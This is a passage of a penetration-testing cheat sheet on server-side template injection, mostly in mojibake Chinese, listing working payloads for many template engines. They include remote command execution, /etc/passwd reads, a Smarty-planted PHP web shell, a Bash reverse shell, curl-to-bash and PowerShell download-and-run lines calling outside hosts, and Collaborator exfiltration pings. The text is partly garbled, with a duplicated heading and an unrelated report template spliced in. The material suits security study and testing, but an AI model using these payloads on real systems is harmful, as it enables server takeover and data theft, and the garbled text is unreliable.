ä¿®å¤é“¾æ¥ï¼š[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` è¯­å¥å®šç•Œç¬¦
* `{{ }}` è¡¨è¾¾å¼å®šç•Œç¬¦
* `{# #}` æ³¨é‡Šå®šç•Œç¬¦
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

æœç´¢"com.hubspot.content.hubl.context.TemplateContextRequest"å¹¶å‘ç°äº†[Githubä¸Šçš„Jinjavaé¡¹ç›®](https://github.com/HubSpot/jinjava/)ã€‚
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**æ›´å¤šä¿¡æ¯**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### è¡¨è¾¾å¼è¯­è¨€ - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

ELæä¾›äº†ä¸€ä¸ªé‡è¦çš„æœºåˆ¶ï¼Œç”¨äºä½¿è¡¨ç¤ºå±‚ï¼ˆç½‘é¡µï¼‰èƒ½å¤Ÿä¸åº”ç”¨ç¨‹åºé€»è¾‘ï¼ˆæ‰˜ç®¡beanï¼‰è¿›è¡Œé€šä¿¡ã€‚ELè¢«**å¤šä¸ªJavaEEæŠ€æœ¯**ä½¿ç”¨ï¼Œä¾‹å¦‚JavaServer FacesæŠ€æœ¯ï¼ŒJavaServer Pages (JSP)æŠ€æœ¯å’ŒJava EEçš„ä¸Šä¸‹æ–‡å’Œä¾èµ–æ³¨å…¥ï¼ˆCDIï¼‰ã€‚\
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£æœ‰å…³**åˆ©ç”¨ELè§£é‡Šå™¨**çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

ä»¥ä¸‹å®‰å…¨ç®¡ç†å™¨ç»•è¿‡æ˜¯ä»è¿™ç¯‡[**æ–‡ç« **](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ä¸­æå–çš„ã€‚
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä»¥**ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ä¸ºä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**æ›´å¤šä¿¡æ¯**

* åœ¨Smartyéƒ¨åˆ†[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - æ¨¡æ¿æ ¼å¼**
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**æ›´å¤šä¿¡æ¯**

* åœ¨[Twigå’ŒTwigï¼ˆæ²™ç›’ï¼‰](https://portswigger.net/research/server-side-template-injection)éƒ¨åˆ†æŸ¥çœ‹æ›´å¤šä¿¡æ¯
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Platesï¼ˆPHPï¼‰

Plateså—Twigå¯å‘ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªåŸç”Ÿçš„PHPæ¨¡æ¿å¼•æ“ï¼Œè€Œä¸æ˜¯ç¼–è¯‘æ¨¡æ¿å¼•æ“ã€‚

æ§åˆ¶å™¨ï¼š
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
é¡µé¢æ¨¡æ¿ï¼š
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
```html
å¸ƒå±€æ¨¡æ¿ï¼š
```
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlib and HTML\_Template\_PHPLIB (PHP)

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB)ä¸PHPlibç›¸åŒï¼Œä½†æ˜¯ç§»æ¤åˆ°äº†Pearã€‚

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
`authors.php`  

## Server-Side Template Injection (SSTI)

### Description

In this scenario, the application is vulnerable to Server-Side Template Injection (SSTI). SSTI occurs when an application allows user input to be evaluated as a template on the server. This can lead to arbitrary code execution and a potential compromise of the server.

### Steps to Reproduce

1. Access the `authors.php` page.
2. Input the payload `{{7*7}}` in the search field.
3. Observe if the page displays `49`. If it does, the application is likely vulnerable to SSTI.

### Impact

An attacker can exploit SSTI to execute arbitrary code on the server, potentially leading to server compromise and unauthorized access to sensitive data.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**æ›´å¤šä¿¡æ¯**

* åœ¨Jadeéƒ¨åˆ†[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)æ˜¯ä¸€ä¸ªéç¼–è¯‘çš„PHPæ¨¡æ¿å¼•æ“ï¼Œä½¿ç”¨XMLæ ‡è®°å°†æ–‡æ¡£åˆ†æˆä¸åŒéƒ¨åˆ†ã€‚
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

è·¯å¾„éå†ï¼ˆæ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ï¼‰ã€‚
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= é”™è¯¯
* ${7\*7} = ${7\*7}
* æ— 
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**æ›´å¤šä¿¡æ¯**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **æ¨¡æ¿** | **æè¿°**                         |
| ------------ | --------------------------------------- |
|              | è¯„ä¼°å’Œå‘ˆç°è¾“å‡º              |
|              | è¯„ä¼°å’Œå‘ˆç°HTMLç¼–ç çš„è¾“å‡º |
|              | æ³¨é‡Š                                 |
| å’Œ          | å…è®¸ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨ï¼‰        |

* \= 49

**å®¢æˆ·ç«¯**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**æœåŠ¡å™¨ç«¯**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**æ›´å¤šä¿¡æ¯**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**ç¤ºä¾‹æœåŠ¡å™¨ç«¯æ¸²æŸ“**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**æ›´å¤šä¿¡æ¯**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = æ— è¾“å‡º
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = é”™è¯¯
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**æ›´å¤šä¿¡æ¯**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£æœ‰å…³åœ¨Pythonä¸­ç»•è¿‡æ²™ç›’æ‰§è¡Œä»»æ„å‘½ä»¤çš„æŠ€å·§ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}







{{os.system('whoami')}}
{{os.system('whoami')}}
```
**æ›´å¤šä¿¡æ¯**

### Jinja2 (Python)

[å®˜æ–¹ç½‘ç«™](http://jinja.pocoo.org)

> Jinja2æ˜¯Pythonçš„ä¸€ä¸ªåŠŸèƒ½é½å…¨çš„æ¨¡æ¿å¼•æ“ã€‚å®ƒå…·æœ‰å®Œæ•´çš„Unicodeæ”¯æŒï¼Œå¯é€‰çš„é›†æˆæ²™ç›’æ‰§è¡Œç¯å¢ƒï¼Œè¢«å¹¿æ³›ä½¿ç”¨å¹¶ä¸”é‡‡ç”¨BSDè®¸å¯è¯ã€‚

* `{{7*7}} = Error`
* `${7*7} = ${7*7}`
* `{{foobar}} æ— `
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}






{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - æ¨¡æ¿æ ¼å¼**
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**ä¸ä¾èµ–**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__` çš„ RCEï¼š
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**å…³äºå¦‚ä½•æ»¥ç”¨Jinjaçš„æ›´å¤šç»†èŠ‚**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= æˆåŠŸ`
* `@() <= æˆåŠŸ`
* `@("{{code}}") <= æˆåŠŸ`
* `@ <= æˆåŠŸ`
* `@{} <= é”™è¯¯!`
* `@{ <= é”™è¯¯!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4MQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbw3AHMAXABUAGEAcwBrAHMAXAB0AGUAcw0AZQB0ADYANAAuAGUAeABlAA==");`

.NET `System.Diagnostics.Process.Start` æ–¹æ³•å¯ç”¨äºåœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨ä»»ä½•è¿›ç¨‹ï¼Œä»è€Œåˆ›å»º Webshellã€‚æ‚¨å¯ä»¥åœ¨ [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp) æ‰¾åˆ°ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ Web åº”ç”¨ç¤ºä¾‹ã€‚

**æ›´å¤šä¿¡æ¯**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = æ— 
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**æ›´å¤šä¿¡æ¯**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

å³ä½¿æ˜¯ Perlï¼Œå®ƒä¹Ÿä½¿ç”¨ç±»ä¼¼ Ruby ä¸­çš„ ERB æ ‡è®°ã€‚

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```
<%= perl code %>
<% perl code %>
```
### GOä¸­çš„SSTI

ç¡®è®¤åç«¯ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“æ˜¯Goçš„æ–¹æ³•æ˜¯ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼š

- `{{ . }}` = ä½œä¸ºè¾“å…¥ä¼ é€’ç»™æ¨¡æ¿çš„æ•°æ®ç»“æ„
- å¦‚æœä¼ é€’çš„æ•°æ®æ˜¯ä¸€ä¸ªåŒ…å«å±æ€§Passwordçš„å¯¹è±¡ï¼Œå‰ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½å°†æ³„æ¼å®ƒï¼Œä½†ä½ ä¹Ÿå¯ä»¥è¿™æ ·åšï¼š`{{ .Password }}`
- `{{printf "%s" "ssti" }}` = åº”è¯¥åœ¨å“åº”ä¸­è¾“å‡ºå­—ç¬¦ä¸²ssti
- `{{html "ssti"}}`, `{{js "ssti"}}` = è¿™äº›æ˜¯å¦å¤–ä¸€äº›æœ‰æ•ˆè´Ÿè½½ï¼Œåº”è¯¥åœ¨ä¸å¸¦å°¾éšå•è¯"js"æˆ–"html"çš„æƒ…å†µä¸‹è¾“å‡ºå­—ç¬¦ä¸²"ssti"ã€‚ä½ å¯ä»¥åœ¨å¼•æ“ä¸­å‚è€ƒæ›´å¤šå…³é”®å­—[è¿™é‡Œ](https://golang.org/pkg/text/template)ã€‚

**XSSåˆ©ç”¨**

å¦‚æœæœåŠ¡å™¨**ä½¿ç”¨text/template**åŒ…ï¼Œé€šè¿‡**ç®€å•**æä¾›ä½ çš„**æœ‰æ•ˆè´Ÿè½½**ä½œä¸ºè¾“å…¥ï¼Œå¾ˆå®¹æ˜“å®ç°XSSã€‚ç„¶è€Œï¼Œ**html/template**ä¸æ˜¯è¿™ç§æƒ…å†µï¼Œå› ä¸ºå®ƒå¯¹å“åº”è¿›è¡Œäº†HTMLç¼–ç ï¼š`{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

ä¸è¿‡ï¼ŒGoå…è®¸**å®šä¹‰**ä¸€ä¸ªå®Œæ•´çš„**æ¨¡æ¿**ï¼Œç„¶å**ç¨åè°ƒç”¨å®ƒ**ã€‚æœ‰æ•ˆè´Ÿè½½å°†ç±»ä¼¼äºï¼š\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCEåˆ©ç”¨**

html/templateæ¨¡å—çš„æ–‡æ¡£å¯ä»¥åœ¨[è¿™é‡Œ](https://golang.org/pkg/html/template/)æ‰¾åˆ°ï¼Œtext/templateæ¨¡å—çš„æ–‡æ¡£å¯ä»¥åœ¨[è¿™é‡Œ](https://golang.org/pkg/text/template/)æ‰¾åˆ°ï¼Œæ˜¯çš„ï¼Œå®ƒä»¬ç¡®å®æœ‰å¾ˆå¤§çš„ä¸åŒã€‚ä¾‹å¦‚ï¼Œåœ¨**text/template**ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œcallâ€å€¼**ç›´æ¥è°ƒç”¨ä»»ä½•å…¬å…±å‡½æ•°**ï¼Œä½†åœ¨html/templateä¸­ä¸æ˜¯è¿™ç§æƒ…å†µã€‚

